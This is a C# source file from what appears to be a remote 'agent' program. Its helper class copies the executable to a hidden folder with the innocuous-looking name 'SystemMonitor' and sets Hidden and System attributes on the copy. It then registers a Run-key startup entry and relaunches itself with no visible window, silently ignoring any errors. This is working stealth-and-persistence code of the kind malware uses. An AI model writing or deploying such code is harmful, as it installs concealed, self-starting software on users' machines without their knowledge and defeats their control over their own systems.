using System.Diagnostics;
using Microsoft.Win32;

namespace KliveLink.Agent
{
    /// <summary>
    /// On first run, copies the current executable to a discreet embedded location,
    /// registers it as a startup application, then relaunches from that location.
    /// Subsequent runs from the embedded path proceed normally.
    /// </summary>
    internal static class EmbedHelper
    {
        private const string EmbedFolderName = "SystemMonitor";
        private const string EmbedExeName = "SystemMonitor.exe";
        private const string StartupRegistryKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string StartupValueName = "SystemMonitor";

        private static readonly string EmbedDirectory =
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), EmbedFolderName);

        private static readonly string EmbedExePath =
            Path.Combine(EmbedDirectory, EmbedExeName);

        /// <summary>
        /// Returns true if the current process is already running from the embedded location.
        /// </summary>
        public static bool IsRunningFromEmbeddedLocation()
        {
            string currentPath = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
            return string.Equals(Path.GetFullPath(currentPath), Path.GetFullPath(EmbedExePath), StringComparison.OrdinalIgnoreCase);
        }

        /// <summary>
        /// Copies the exe to the embedded location, hides it, registers startup, and relaunches.
        /// Returns true if the caller should exit (relaunch happened).
        /// Returns false if already embedded or embedding failed.
        /// </summary>
        public static bool EmbedAndRelaunch(string[] originalArgs)
        {
            if (IsRunningFromEmbeddedLocation())
                return false;

            try
            {
                string currentExe = Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                    return false;

                // Create hidden directory
                if (!Directory.Exists(EmbedDirectory))
                {
                    Directory.CreateDirectory(EmbedDirectory);
                    var dirInfo = new DirectoryInfo(EmbedDirectory);
                    dirInfo.Attributes |= FileAttributes.Hidden;
                }

                // Copy exe (overwrite if updating)
                File.Copy(currentExe, EmbedExePath, overwrite: true);
                File.SetAttributes(EmbedExePath, FileAttributes.Hidden | FileAttributes.System);

                // Register in current-user startup via registry
                using var key = Registry.CurrentUser.OpenSubKey(StartupRegistryKey, writable: true);
                key?.SetValue(StartupValueName, $"\"{EmbedExePath}\"");

                // Relaunch from embedded location with the same arguments
                Process.Start(new ProcessStartInfo
                {
                    FileName = EmbedExePath,
                    Arguments = string.Join(" ", originalArgs.Select(a => a.Contains(' ') ? $"\"{a}\"" : a)),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                return true;
            }
            catch
            {
                // If embedding fails, continue running from current location
                return false;
            }
        }
    }
}
